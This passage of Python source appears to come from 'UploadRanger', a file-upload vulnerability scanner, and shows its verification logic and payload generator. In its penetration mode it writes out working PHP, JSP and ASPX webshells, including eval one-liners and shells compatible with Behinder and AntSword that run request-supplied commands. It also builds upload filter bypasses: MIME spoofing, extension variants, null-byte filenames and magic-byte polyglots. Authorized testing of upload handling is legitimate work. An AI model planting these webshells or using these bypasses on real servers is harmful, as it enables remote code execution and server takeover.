                    req_headers = f"POST {target_url} HTTP/1.1\r\nHost: {target_url.split('://', 1)[-1].split('/', 1)[0]}\r\nContent-Type: multipart/form-data"
                    req_body = ""
        else:
            # 【修复】httpx.Response 类型：构建完整的 HTTP 请求（包括请求行）
            req_method = getattr(response.request, 'method', 'POST')
            req_url = str(getattr(response.request, 'url', target_url))
            # 提取路径部分（去掉 scheme 和 host）
            from urllib.parse import urlparse
            parsed = urlparse(req_url)
            req_path = parsed.path + (f"?{parsed.query}" if parsed.query else "")
            if not req_path:
                req_path = "/"
            req_line = f"{req_method} {req_path} HTTP/1.1"
            req_headers = req_line + "\n" + "\n".join([f"{k}: {v}" for k, v in response.request.headers.items()])
            # 从 httpx 请求中获取请求体
            req_body = ""
            try:
                if hasattr(response.request, 'content') and response.request.content:
                    req_body = engine._format_request_body(response.request.content)
            except:
                pass
            try:
                raw_headers = req_headers.replace("\n", "\r\n").encode("latin-1", errors="replace")
                raw_content = bytes(getattr(response.request, 'content', b"") or b"")
                request_evidence = (raw_headers + b"\r\n\r\n" + raw_content).decode("latin-1", errors="replace")
            except Exception:
                request_evidence = f"{req_headers}\r\n\r\n{req_body}"
        res_headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
        
        # 【修复】将相对路径转换为完整URL
        path_leaked = analysis.get('path_leaked') or ''
        if path_leaked and not path_leaked.startswith('http'):
            # 相对路径，转换为完整URL
            from urllib.parse import urljoin
            path_leaked = urljoin(target_url, path_leaked)
        
        # 构建结果字典
        result = {
            'filename': actual_filename,
            'payload_type': payload.get('type', 'unknown'),
            'payload_source': payload.get('source', 'builtin'),
            'strategy': payload.get('strategy', ''),
            'description': payload.get('desc', ''),
            'status_code': response.status_code,
            'is_success': analysis['is_success'],
            'is_redirect': analysis.get('is_redirect', False),
            'success_probability': analysis['success_probability'],
            'path_leaked': path_leaked,
            'response_length': analysis['length'],
            'confidence_level': analysis.get('confidence_level', 'low'),
            'decision_reasons': analysis.get('decision_reasons', []),
            'server_filename': analysis.get('server_filename'),
            'followed_redirect': followed_redirect,
            'log_id': _current_log.id if _current_log is not None else None,
            'verification_log_id': None,
            'verification_attempts': [],
            'is_vulnerability': False,
            'finding': None,
            'request_headers': req_headers,
            'request_body': req_body,  # 添加请求体
            'response_headers': res_headers,
            # 【修复 P2】结果 dict 字节/文本封顶：每行全量驻留会在大响应场景
            # 内存暴涨（n≤1200 行 × 10MB 级响应）。1MB 对人工复核足够；
            # 判定/证据链用的是实时 check_resp/traffic，不受此截断影响。
            'response_body': (response.text[:1_048_576]
                              + (f"\n\n[已截断：共 {len(response.text)} 字符]" if len(response.text) > 1_048_576 else "")),
            'response_body_bytes': _cap_bytes(getattr(response, 'content', b'') or b'')
        }
        if followed_redirect:
            extra = f"重定向跟进: {redirect_location}"
            result['decision_reasons'] = (result.get('decision_reasons', []) + [extra])[:10]
        
        # 【红队方案】验证优先：所有上传都尝试验证，仅验证成功才判定成功
        verified_execution = False
        verified_upload = False
        verification_url = None
        
        # 提取验证候选文件名
        candidates = analysis.get('verify_filenames') or [actual_filename]
        # Flask/Werkzeug secure_filename 将隐藏文件 .htaccess 规范化为 _htaccess。
        if actual_filename.lower() == ".htaccess" and "_htaccess" not in candidates:
            candidates.append("_htaccess")
        
        def _looks_like_filesystem_path(p: str) -> bool:
            low = (p or "").strip()
            if not low:
                return False
            if low.startswith("\\\\"):
                return True
            if len(low) >= 3 and low[1] == ":" and (low[2] in ("\\", "/")):
                return True
            if low.startswith("/"):
                if any(seg in low for seg in ("/var/", "/usr/", "/etc/", "/home/", "/opt/", "/tmp/")):
                    return True
            return False

        def _candidate_urls_from_leak(leak: str) -> List[str]:
            leak = (leak or "").strip()
            if not leak or _looks_like_filesystem_path(leak):
                return []
            low = leak.lower()
            last = leak.split("?")[0].split("#")[0].rstrip("/")
            last_seg = last.rsplit("/", 1)[-1] if "/" in last else last
            if not ("." in last_seg):
                return []
            matched = False
            for name in candidates:
                n = (name or "").strip().lower()
                if n and (last_seg.lower() == n or n in low):
                    matched = True
                    break
            if not matched and not any(k in low for k in ("/upload", "/uploads", "/files", "/images")):
                return []
            if low.startswith("http://") or low.startswith("https://"):
                return [leak]
            # 在函数内部导入urljoin，避免嵌套函数作用域问题
            from urllib.parse import urljoin as _urljoin
            return [_urljoin(target_url, leak)]

        verification_urls: List[str] = []
        if upload_dir:
            base = upload_dir.rstrip("/")
            for check_filename in candidates:
                if not check_filename:
                    continue
                verification_urls.append(f"{base}/{quote(check_filename, safe='/%._-')}")

        leaked = analysis.get("path_leaked") or ""
        verification_urls.extend(_candidate_urls_from_leak(leaked))
        
        # 【修复】当无路径泄露且未配置upload_dir时，尝试常见上传目录
        if not verification_urls and not leaked:
            from urllib.parse import urljoin, urlparse
            parsed = urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            common_paths = ["/uploads/", "/upload/", "/files/", "/images/", "/assets/"]
            for path in common_paths:
                for check_filename in candidates:
                    if not check_filename:
                        continue
                    verification_urls.append(urljoin(base_url, f"{path}{quote(check_filename, safe='/%._-')}"))

        seen_vu = set()
        
        # 显式响应路径、用户提供目录和通用目录依次加入候选。保留上限，
        # 防止未知目标因重命名候选过多而产生无意义请求。
        max_verify_urls = min(len(verification_urls), 12)
        for idx, u in enumerate(verification_urls):
            if idx >= max_verify_urls:
                break
                
            u = (u or "").strip()
            if not u:
                continue
            if u in seen_vu:
                continue
            if not safe_verification_url(u, target_url):
                if self._on_log_callback:
                    self._on_log_callback(f"[安全] 拒绝跨域或私网验证 URL: {u}")
                continue
            seen_vu.add(u)
            verification_url = u
            attempt = {
                'url': verification_url,
                'status_code': None,
                'content_match': False,
                'marker_match': False,
            }
            try:
                # 添加超时保护，避免验证请求卡住
                check_resp = await asyncio.wait_for(
                    engine.check_file_existence(verification_url),
                    timeout=3.0  # 最多等待3秒
                )
                verification_log = engine.last_traffic_log
                attempt['status_code'] = check_resp.status_code
                if check_resp.status_code != 200:
                    result['verification_attempts'].append(attempt)
                    continue

                content_matches = check_resp.content == content
                marker = b'UploadRanger Security Test File'
                marker_matches = marker in content and marker in check_resp.content
                attempt['content_match'] = bool(content_matches)
                attempt['marker_match'] = bool(marker_matches)
                # 【修复】执行证据链 nonce 化：原先的固定成功标记在全仓库没有
                # 生成端（RCE 判定不可达死代码），针对固定数字串的响应匹配又可
                # 被任何静态原样回显文件的服务器满足（伪证据）。
                # 改为：本轮唯一 nonce 被回显，且响应字节与原文件不一致——
                # 静态回显无法同时满足"回显 nonce"与"响应 ≠ 原文件"，二者同时
                # 成立才认定脚本实际执行。nonce 为空时不参与判定（避免前缀
                # "UploadRanger_" 误命中无害内容自身的说明文字）。
                nonce_marker = f"UploadRanger_{self._scan_nonce}".encode() if getattr(self, '_scan_nonce', '') else b""
                nonce_matches = bool(nonce_marker) and nonce_marker in content and nonce_marker in check_resp.content
                attempt['nonce_match'] = bool(nonce_matches)
                # 【二轮加固】执行判定追加"语言标签已消费"条件：探针真实执行时
                # 解释器会吞掉 <?php / <% 标签，而任何静态/包装回显（文本预览页、
                # 错误页内嵌文件内容）都会保留标签。回显 nonce 且标签仍原样存在
                # → 只是内容被转述，不是执行。
                _probe_tag = b""
                _ptype = str(payload.get('type', ''))
                if 'php' in _ptype:
                    _probe_tag = b"<?php"
                elif _ptype.startswith(('exec_probe_jsp', 'exec_probe_aspx')) or 'jsp' in _ptype or 'aspx' in _ptype:
                    _probe_tag = b"<%"
                _tag_absent = (not _probe_tag) or (_probe_tag not in check_resp.content)
                if nonce_marker and nonce_marker in check_resp.content and check_resp.content != content and _tag_absent:
                    verified_execution = True
                    result['verified_execution'] = True
                # 仅 HTTP 200 不足以证明是本轮上传：共享目录中的 stale 文件也可能返回 200。
                # 安全模式要求内容指纹一致；执行模式可由实际执行证据建立关联。
                # 文本型安全测试文件可能被服务端包装；稳定标记可补充字节级
                # 比对。图片转码等不可逆处理仍维持待验证，避免 200 误报。
                verified_upload = bool(content_matches or marker_matches or nonce_matches or verified_execution)
                if verified_upload:
                    result['verified_upload'] = True
                    result['path_leaked'] = result.get('path_leaked') or verification_url
                    result['verification_url'] = verification_url
                    if verification_log is not None:
                        verification_log.parent_log_id = result['log_id']
                        verification_log.is_verification = True
                        verification_log.is_success = True
                        result['verification_log_id'] = verification_log.id
                        if self._traffic_update_cb:
                            self._traffic_update_cb(verification_log.id, True)
                    result['verification'] = {
                        'verified': True,
                        'status': 'success',
                        'content_match': bool(content_matches),
                        'marker_match': bool(marker_matches),
                        'execution_confirmed': bool(verified_execution),
                    }

                    result['verification_attempts'].append(attempt)
                    break
                result['verification_attempts'].append(attempt)
            except Exception as exc:
                attempt['error'] = str(exc)
                result['verification_attempts'].append(attempt)
                continue
        
        # 【修复】验证优先，但无法验证时保留高置信度分析结果
        if verified_upload:
            result['is_success'] = True
            result['success_probability'] = 100
            result['confidence_level'] = 'high'
        else:
            # 未通过实际访问验证时只能保留 PENDING，不创建高危漏洞。
            result['is_success'] = False
            result['verification_tier'] = 'PENDING'
            result['success_probability'] = analysis['success_probability']
            result.setdefault('decision_reasons', []).append('响应疑似成功，但文件访问验证未通过')
        
        # 构造发现结果
        if verified_execution:
            result['is_vulnerability'] = True
            result['finding'] = self.analyzer.create_finding(
                name=f"远程代码执行 ({payload.get('type', 'unknown')})",
                description=f"成功上传并执行 {payload.get('type', 'unknown')} 文件",
                risk_level=RISK_CRITICAL,
                confidence=CONFIDENCE_CERTAIN,
                url=target_url,
                payload=actual_filename,
                proof=f"文件可在 {verification_url} 访问并执行代码",
                remediation="验证文件扩展名白名单，禁用上传目录的执行权限",
                request_data=request_evidence or f"{req_headers}\r\n\r\n{req_body}",
                response_data=f"HTTP/1.1 {response.status_code}\r\n{res_headers}\r\n\r\n{response.text}"
            )
        elif verified_upload:
            # 文件能被访问并不等于任意文件上传漏洞：正常图片、文档或
            # 以安全扩展名结尾的双扩展名都可能是预期业务。只有服务端
            # 实际保留危险最终扩展名时才可确认高危；其他情况保留上传
            # 证据供人工结合执行链、SVG 渲染或服务器解析规则继续验证。
            from config import SCAN_CONFIG
            final_ext = actual_filename.rsplit('.', 1)[-1].lower() if '.' in actual_filename else ''
            dangerous_exts = {str(ext).lower().lstrip('.') for ext in SCAN_CONFIG['dangerous_extensions']}
            if final_ext in dangerous_exts:
                result['is_vulnerability'] = True
                result['finding'] = self.analyzer.create_finding(
                    name=f"任意文件上传 ({payload.get('type', 'unknown')})",
                    description=f"成功上传并可访问危险扩展名 .{final_ext} 文件",
                    risk_level=RISK_HIGH,
                    confidence=CONFIDENCE_CERTAIN,
                    url=target_url,
                    payload=actual_filename,
                    proof=f"危险扩展名文件可在 {verification_url} 访问",
                    remediation="使用服务端白名单校验文件类型，并禁止上传目录执行脚本",
                    request_data=request_evidence or f"{req_headers}\r\n\r\n{req_body}",
                    response_data=f"HTTP/1.1 {response.status_code}\r\n{res_headers}\r\n\r\n{response.text}"
                )
            else:
                result['verification_tier'] = 'PENDING'
                result.setdefault('decision_reasons', []).append(
                    f"已验证上传 .{final_ext or '无扩展名'} 文件，但缺少可执行最终扩展名或执行证据"
                )
        
        # 【新增】更新 TrafficLog 的 is_success 状态（用于 TrafficViewer 颜色渲染）
        if _current_log is not None:
            is_success = result.get('is_success', False)
            _current_log.is_success = is_success
            # 发送更新信号，让 TrafficViewer 刷新颜色
            if self._traffic_update_cb:
                self._traffic_update_cb(_current_log.id, is_success)
        
        # 发送结果到回调（用于实时显示）
        callback = self._on_result_callback
        if result and callback:
            try:
                callback(result)
            except Exception:
                pass
        
        return result

    @staticmethod
    def _payload_key(payload: dict) -> tuple:
        """Use upload-relevant fields for deterministic de-duplication."""
        content = payload.get("content", b"")
        if isinstance(content, str):
            content = content.encode("utf-8")
        return (
            str(payload.get("filename") or ""),
            str(payload.get("ext") or "").lower().lstrip("."),
            str(payload.get("fake_content_type") or "application/octet-stream").lower(),
            bytes(content),
        )

    def _normalize_custom_payloads(
        self, custom_payloads: Optional[List[dict]], selected_extensions: Optional[List[str]]
    ) -> List[dict]:
        """Validate GUI/API custom payloads before they enter multipart construction."""
        allowed = None
        if selected_extensions:
            allowed = {str(ext).lower().lstrip(".") for ext in selected_extensions}
        normalized: List[dict] = []
        for index, item in enumerate(custom_payloads or []):
            if not isinstance(item, dict) or item.get("enabled", True) is False:
                continue
            filename = str(item.get("filename") or "custom.bin").replace("/", "_").replace("\\", "_").strip()
            filename = filename.lstrip(".") or "custom.bin"
            ext = str(item.get("ext") or filename.rsplit(".", 1)[-1] if "." in filename else "bin").lower().lstrip(".")
            if allowed is not None and ext not in allowed:
                continue
            content = item.get("content", b"")
            if isinstance(content, str):
                content = content.encode("utf-8")
            elif not isinstance(content, bytes):
                content = bytes(content)
            normalized.append({
                "type": str(item.get("type") or "custom_payload"),
                "ext": ext,
                "filename": filename,
                "content": content,
                "fake_content_type": str(item.get("content_type") or item.get("fake_content_type") or "application/octet-stream"),
                "desc": str(item.get("description") or item.get("name") or f"Custom payload {index + 1}"),
                "source": "custom",
                "strategy": "custom",
                "priority": int(item.get("priority", 100)),
            })
        normalized.sort(key=lambda payload: payload.get("priority", 100), reverse=True)
        return self._merge_payloads(normalized)

    def _merge_payloads(self, *groups: List[dict]) -> List[dict]:
        """Keep custom entries first and preserve every distinct upload request."""
        merged: List[dict] = []
        seen = set()
        for group in groups:
            for raw in group or []:
                payload = dict(raw)
                payload.setdefault("source", "builtin")
                key = self._payload_key(payload)
                if key not in seen:
                    seen.add(key)
                    merged.append(payload)
        return merged

    def _unique_scan_filename(self, filename: str) -> str:
        name = str(filename or "upload.bin").replace("\\", "_").replace("/", "_")
        # 隐藏配置文件通常要求精确文件名（例如 .htaccess），不能加前缀。
        # 其验证仍依赖响应/内容证据，避免把普通文件的唯一命名策略带入此类规则。
        if name.startswith("."):
            return name
        prefix = f"ur_{self._scan_nonce}_"
        return name if name.startswith(prefix) else prefix + name
    
    def _mime_for_ext(self, ext: str) -> str:
        """按扩展名返回常规 MIME 类型（未识别时回退 application/octet-stream）。

        请求按类型自动变化：除 mime_fake 系（仍用伪造值）外，文件 part 的
        Content-Type 不再一律 application/octet-stream。
        """
        mime_map = {
            "jpg": "image/jpeg",
            "jpeg": "image/jpeg",
            "png": "image/png",
            "gif": "image/gif",
            "bmp": "image/bmp",
            "webp": "image/webp",
            "svg": "image/svg+xml",
            "html": "text/html",
            "htm": "text/html",
            "pdf": "application/pdf",
            "doc": "application/msword",
            "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "xls": "application/vnd.ms-excel",
            "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "ppt": "application/vnd.ms-powerpoint",
            "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "txt": "text/plain",
            "xml": "application/xml",
            "json": "application/json",
        }
        return mime_map.get(str(ext or "").lower().lstrip("."), "application/octet-stream")

    def _next_boundary(self) -> str:
        """生成 multipart boundary：在三种风格间轮换并附加随机后缀。

        避免整个扫描过程使用单一 boundary 形成指纹特征（原 RawHTTPClient
        固定 ----WebKitFormBoundaryUploadRanger 前缀）。
        """
        if not hasattr(self, '_boundary_style'):
            self._boundary_style = 0
        style = self._boundary_style % 3
        self._boundary_style += 1
        if style == 0:
            # WebKit 风格：----WebKitFormBoundary + 16 位随机
            rand16 = ''.join(random.choice(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            ) for _ in range(16))
            return f"----WebKitFormBoundary{rand16}"
        if style == 1:
            # UploadRanger 风格：带本轮扫描 nonce + 8 位随机
            return f"----UploadRangerBoundary{getattr(self, '_scan_nonce', '')}{random.randint(10**7, 10**8 - 1)}"
        # 浏览器原生风格：--------------------------- + 19 位随机
        return f"---------------------------{random.randint(10**18, 10**19 - 1)}"

    async def _send_template_payload(self, engine, filename: str, content: bytes, content_type: str):
        if not self._request_template or not self._request_template.file_parts:
            raise ValueError("RequestTemplate 未包含文件字段")
        field = self._request_template.file_parts[0].field
        mutated = mutate_file(self._request_template, field, filename, content, content_type)
        # 【新增】multipart 边界按请求轮换：用户导入的模板通常携带固定 boundary，
        # 这里重写为每请求随机值，避免单一 boundary 指纹（原始模板保持不变）。
        ct_key = next((k for k in mutated.headers if str(k).lower() == "content-type"), None)
        if ct_key and "multipart/form-data" in str(mutated.headers[ct_key]).lower():
            ctype_head = str(mutated.headers[ct_key]).split("boundary=", 1)[0].rstrip("; ").strip()
            if not ctype_head:
                ctype_head = "multipart/form-data"
            mutated.headers[ct_key] = f"{ctype_head}; boundary={self._next_boundary()}"
        raw = build_raw_request(mutated)
        head, _, body = raw.partition(b"\r\n\r\n")
        headers = {}
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                key, value = line.split(b":", 1)
                headers[key.decode("latin-1")] = value.decode("latin-1").strip()
        return await engine.request(mutated.method, mutated.url, headers=headers, content=body)

    def _log_raw_traffic(
        self,
        engine: AsyncHTTPClient,
        method: str,
        url: str,
        req_note: str,
        raw_resp,
    ) -> Optional[TrafficLog]:
        """记录流量日志，返回创建的 TrafficLog 对象"""
        if not self._traffic_cb:
            return None
        engine.request_counter += 1
        req_headers_text = ""
        req_body_text = req_note or ""
        raw_req = getattr(raw_resp, "raw_request", b"") or b""
        if raw_req:
            try:
                hdr_end = raw_req.find(b"\r\n\r\n")
                if hdr_end != -1:
                    req_headers_text = raw_req[:hdr_end].decode("latin-1", errors="replace")
                    body_bytes = raw_req[hdr_end + 4 :]
                    req_body_text = engine._format_request_body(body_bytes)
                else:
                    req_headers_text = raw_req.decode("latin-1", errors="replace")
            except Exception:
                req_headers_text = ""
        res_headers = "\n".join(f"{k}: {v}" for k, v in raw_resp.headers.items())
        res_body = engine._format_response_body(raw_resp.text, raw_resp.content)
        log = TrafficLog(
            id=engine.request_counter,
            timestamp=datetime.now().strftime("%H:%M:%S"),
            method=method,
            url=url,
            status_code=raw_resp.status_code,
            request_headers=req_headers_text,
            request_body=req_body_text,
            response_headers=res_headers,
            response_body=res_body,
            response_body_bytes=getattr(raw_resp, "content", b"") or b"",
            request_raw=raw_req,
        )
        self._traffic_cb(log)
        return log  # 【新增】返回 log 对象以便后续更新 is_success
    
    def _generate_harmless_content(self, lang: str, marker: str = "Test") -> bytes:
        """生成安全模式下的纯文本内容（不含任何可执行代码）

        内容内嵌每轮扫描唯一的 nonce 标记（UploadRanger_{scan_nonce}），
        供验证段建立"确属本轮上传"的证据链（内容指纹/标记/执行 nonce）。
        """
        from config import VERSION
        # getattr 防御：单测等场景可能未经过 scan() 初始化 _scan_nonce
        nonce = getattr(self, '_scan_nonce', '')
        content = f"""<!--
    ================================================
    UploadRanger Security Test File
    ================================================
    This file is generated by UploadRanger v{VERSION}
    Only for security testing purposes
    
    Warning:
    - This is a harmless content file
    - No executable code is included
    - For authorized security testing only
    
    Language: {lang}
    Marker: {marker}
    ================================================
-->
<!DOCTYPE html>
<html>
<head>
    <title>UploadRanger Security Test - {lang}</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>UploadRanger Security Test File</h1>
    <p>This file is generated by UploadRanger for security testing</p>
    <p>Extension: {lang}</p>
    <p>Marker: {marker}</p>
    <p>Nonce: UploadRanger_{nonce}</p>
    <hr>
    <p><small>Generated by UploadRanger v{VERSION}</small></p>
</body>
</html>"""
        return content.encode('utf-8')

    def _generate_exec_probe(self, lang: str, nonce: str) -> bytes:
        """生成无害执行探针：仅回显随机标识，不含任何危险操作。

        安全模式下用于验证上传目录是否真的解析脚本：服务器执行该文件时
        会原样输出 UploadRanger_{nonce}，验证段据此建立执行证据
        （回显 nonce 且响应字节 != 原文件才算执行）。
        """
        if lang == "PHP":
            return f"<?php echo 'UploadRanger_{nonce}'; ?>".encode("utf-8")
        if lang == "JSP":
            return f"<% out.println(\"UploadRanger_{nonce}\"); %>".encode("utf-8")
        if lang == "ASP.NET":
            return f"<%= \"UploadRanger_{nonce}\" %>".encode("utf-8")
        # 未知语言退化为纯文本标记（不产生执行语义）
        return f"UploadRanger_{nonce}".encode("utf-8")
    
    def _generate_php_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成PHP WebShell"""
        if shell_type == "基础eval":
            return f"<?php @eval($_POST['{password}']); ?>".encode()
        elif shell_type == "Base64免杀":
            return f"<?php $c=base64_decode($_POST['{password}']);@assert($c); ?>".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<?php
@session_start();
$key='{password}';
$post=file_get_contents("php://input");
if(!$post){{exit;}}
$key=md5($key);
$iv=md5(md5($key));
$post=openssl_decrypt($post,"AES-128-CBC",$key,OPENSSL_RAW_DATA,$iv);
$post=unserialize($post);
$func=$post['func'];
$param=$post['param'];
$func($param);
?>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑标准一句话木马，使用默认密码 ant
            return "<?php @eval($_POST['ant']); ?>".encode()
        else:
            return f"<?php @eval($_POST['{password}']); ?>".encode()
    
    def _generate_jsp_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成JSP WebShell"""
        if shell_type == "基础eval":
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("{password}")!=null) {{
    String cmd=request.getParameter("{password}");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<%!
class U extends ClassLoader{{U(ClassLoader c){{super(c);}}
    public Class g(byte[] b){{return super.defineClass(b,0,b.length);}}
}}
%>
<% String cls=request.getParameter("{password}");
    if(cls!=null){{
        new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext);
    }}%>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑JSP一句话木马
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("ant")!=null) {{
    String cmd=request.getParameter("ant");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
        else:
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("{password}")!=null) {{
    String cmd=request.getParameter("{password}");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
    
    def _generate_aspx_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成ASPX WebShell"""
        if shell_type == "基础eval":
            return f"""<%@ Page Language="C#"%>
<%if(Request["{password}"]!=null){{
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["{password}"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<%@ Page Language="C#" validateRequest="false" %>
<% System.Reflection.Assembly.Load(Request.BinaryRead(Request.ContentLength)).CreateInstance("U").Equals(Request.Form["{password}"]); %>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑ASPX一句话木马
            return f"""<%@ Page Language="C#"%>
<%if(Request["ant"]!=null){{
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["ant"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
        else:
            return f"""<%@ Page Language="C#"%>
<%if(Request["{password}"]!=null){{
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["{password}"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
    
    def _generate_payloads(self, max_limit: Optional[int] = 200, selected_extensions: Optional[List[str]] = None, 
                          scan_mode: str = "security", webshell_config: Optional[dict] = None) -> List[dict]:
        """生成测试 payloads；max_limit 为 None 时返回完整列表（供指纹过滤后再截断）。

        【BUG-2/3/10修复】调整顺序：高价值绕过扩展名优先；删除与批量section重叠的硬编码列表；
        大小写绕过仅对真正受黑名单限制的扩展名（php/asp/aspx/jsp）生成。
        
        Args:
            max_limit: 最大payload数量限制
            selected_extensions: 用户选择的后缀列表，如 [".php", ".phtml", ".asp"]
            scan_mode: 扫描模式 - security(安全测试) / penetration(渗透测试)
            webshell_config: WebShell配置 {'enabled': True, 'password': 'xxx', 'type': 'xxx'}
        """
        payloads = []
        
        # 获取扫描模式配置
        is_penetration = scan_mode == "penetration"
        shell_pwd = (webshell_config or {}).get("password", "UploadRanger") if is_penetration else "test"
        shell_type = (webshell_config or {}).get("type", "基础eval") if is_penetration else ""
        
        # 解析用户选择的后缀（去掉点号）
        if selected_extensions:
            selected_exts_clean = [ext.lstrip('.') for ext in selected_extensions]
        else:
            selected_exts_clean = None  # None表示全部允许

        # 根据模式选择内容
        from config import VERSION
        if is_penetration:
            # 渗透测试模式 - 使用WebShell内容
            php_content = self._generate_php_webshell(shell_pwd, shell_type)
            jsp_content = self._generate_jsp_webshell(shell_pwd, shell_type)
            aspx_content = self._generate_aspx_webshell(shell_pwd, shell_type)
        else:
            # 安全测试模式 - 使用纯文本内容（不含可执行代码）
            php_content = self._generate_harmless_content("PHP", f"UploadRanger v{VERSION}")
            jsp_content = self._generate_harmless_content("JSP", f"UploadRanger v{VERSION}")
            aspx_content = self._generate_harmless_content("ASP.NET", f"UploadRanger v{VERSION}")
            # 【新增】安全模式执行探针：按已选后缀为 php/jsp/aspx 各追加一个
            # 仅回显本轮随机标识的无害文件，用于验证上传目录是否真的解析脚本
            # （验证段要求"回显 nonce 且响应字节 != 原文件"才算执行证据）。
            # 渗透模式不追加，webshell 路径保持原状。
            exec_probe_langs = (("php", "PHP"), ("jsp", "JSP"), ("aspx", "ASP.NET"))
            probe_nonce = getattr(self, '_scan_nonce', '')
            for probe_ext, probe_lang in exec_probe_langs:
                if selected_exts_clean is None or probe_ext in selected_exts_clean:
                    payloads.append({
                        "type": f"exec_probe_{probe_ext}",
                        "ext": probe_ext,
                        "filename": f"probe_{probe_nonce}.{probe_ext}",
                        "content": self._generate_exec_probe(probe_lang, probe_nonce),
                        "desc": "无害执行探针(仅回显随机标识)",
                    })

        # 1. 标准WebShell
        # 注意：安全测试模式下，这些也会生成但内容是无害的

        # 只添加用户选择的后缀
        if selected_exts_clean is None or 'php' in selected_exts_clean:
            payloads.append({"type": "php_shell", "ext": "php", "content": php_content, "desc": "标准PHP Shell"})
        if selected_exts_clean is None or 'jsp' in selected_exts_clean:
            payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
        if selected_exts_clean is None or 'aspx' in selected_exts_clean:
            payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})

        # 1.5 【新增】MIME类型伪造 - 专门针对只检查$_FILES['type']的PHP漏洞
        # 保持恶意扩展名，但伪造Content-Type为图片类型
        mime_fake_payloads = [
            ("php", "image/jpeg", php_content),
            ("php", "image/png", php_content),
            ("php", "image/gif", php_content),
            ("php", "image/bmp", php_content),
            ("php", "image/webp", php_content),
            ("asp", "image/jpeg", aspx_content),
            ("aspx", "image/jpeg", aspx_content),
            ("jsp", "image/jpeg", jsp_content),
        ]
        for ext, fake_mime, content in mime_fake_payloads:
            payloads.append({
                "type": f"mime_fake_{fake_mime.replace('/', '_')}",
                "ext": ext,
                "filename": f"shell.{ext}",
                "content": content,
                "desc": f"MIME伪造 {fake_mime} -> .{ext}",
                "fake_content_type": fake_mime,  # 关键：标记需要伪造的Content-Type
            })

        # 2. 【BUG-2修复】PHP扩展名变体 - 黑名单外的有效绕过排在最前
        # 优先测试不在常见黑名单(.php/.asp/.aspx/.jsp)里的变体
        php_bypass_exts = ["phtml", "pht", "phar", "php3", "php4", "php5", "php7", "phps"]
        for ext in php_bypass_exts:
            payloads.append({
                "type": f"php_variant_{ext}",
                "ext": ext,
                "content": php_content,
                "desc": f"PHP变体 .{ext}"
            })

        # 注：section 3（硬编码double_exts）已删除 - 【BUG-3修复】
        # 所有双扩展名组合由下方 section 14a 统一生成，避免重复
        base_name = "shell"
        
        # 4. 空字节注入 - 【新增】更多变体
        null_byte_variants = [
            ("shell.php%00.jpg", "php%00.jpg"),
            ("shell.php%2500.jpg", "php%2500.jpg"),
            ("shell.php\\x00.jpg", "php\\x00.jpg"),
            ("shell.php\\0.jpg", "php\\0.jpg"),
            ("shell.php%2500.png", "php%2500.png"),
            ("shell.php%2500.gif", "php%2500.gif"),
        ]
        for filename, ext in null_byte_variants:
            payloads.append({
                "type": "null_byte_injection",
                "ext": ext,
                "filename": filename,
                "content": php_content,
                "desc": f"空字节注入 {filename}"
            })
        
        # 5. Polyglots / 魔术字节 - 【新增】更多类型
        gif_polyglot = b"GIF89a" + php_content
        payloads.append({
            "type": "polyglot_gif",
            "ext": "php",
            "filename": "logo.gif.php",
            "content": gif_polyglot,
            "desc": "GIF89a Polyglot"
        })
        
        png_magic = b"\x89PNG\r\n\x1a\n"
        png_content = png_magic + php_content
        payloads.append({
            "type": "magic_png",
            "ext": "php",
            "filename": "image.png.php",
            "content": png_content,
            "desc": "PNG魔术字节 + PHP"
        })
        
        jpg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF"
        jpg_content = jpg_magic + php_content
        payloads.append({
            "type": "magic_jpg",
            "ext": "php",
            "filename": "image.jpg.php",
